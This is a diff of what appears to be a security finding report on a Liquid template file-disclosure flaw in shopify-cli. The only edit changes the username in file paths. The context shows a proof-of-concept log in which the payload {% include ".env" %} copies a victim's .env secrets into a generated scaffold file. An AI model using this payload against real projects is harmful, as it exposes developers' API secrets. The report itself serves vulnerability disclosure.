@@ -68,14 +68,14 @@ The execution log confirms the real renderer copied the victim `.env` marker int
 [*] Victim CWD contains .env marker: PIOLIUM_LIQUID_SECRET_1777623336_55039
 [*] Malicious template payload: {% include ".env" %}
 [*] Invoking actual recursiveLiquidTemplateCopy() from cli-kit with victim CWD...
-[+] Generated scaffold file contains victim .env contents: /Users/bytedance/Desktop/oss-to-run/shopify-cli/piolium/findings/p10-liquid-template-root-file-disclosure/evidence/work/generated-app/leaked-env.txt
+[+] Generated scaffold file contains victim .env contents: /Users/j3ssie/Desktop/oss-to-run/shopify-cli/piolium/findings/p10-liquid-template-root-file-disclosure/evidence/work/generated-app/leaked-env.txt
 {"status":"confirmed","evidence":"victim .env marker copied into generated scaffold","notes":"actual recursiveLiquidTemplateCopy() rendered attacker include from process CWD"}
 ```
 
 `evidence/impact.log` contains the disclosed secret material in the generated file:
 
 ```text
-Generated scaffold file: /Users/bytedance/Desktop/oss-to-run/shopify-cli/piolium/findings/p10-liquid-template-root-file-disclosure/evidence/work/generated-app/leaked-env.txt
+Generated scaffold file: /Users/j3ssie/Desktop/oss-to-run/shopify-cli/piolium/findings/p10-liquid-template-root-file-disclosure/evidence/work/generated-app/leaked-env.txt
 Leaked marker observed in generated scaffold: PIOLIUM_LIQUID_SECRET_1777623336_55039
 --- generated file ---
 SHOPIFY_API_SECRET=PIOLIUM_LIQUID_SECRET_1777623336_55039
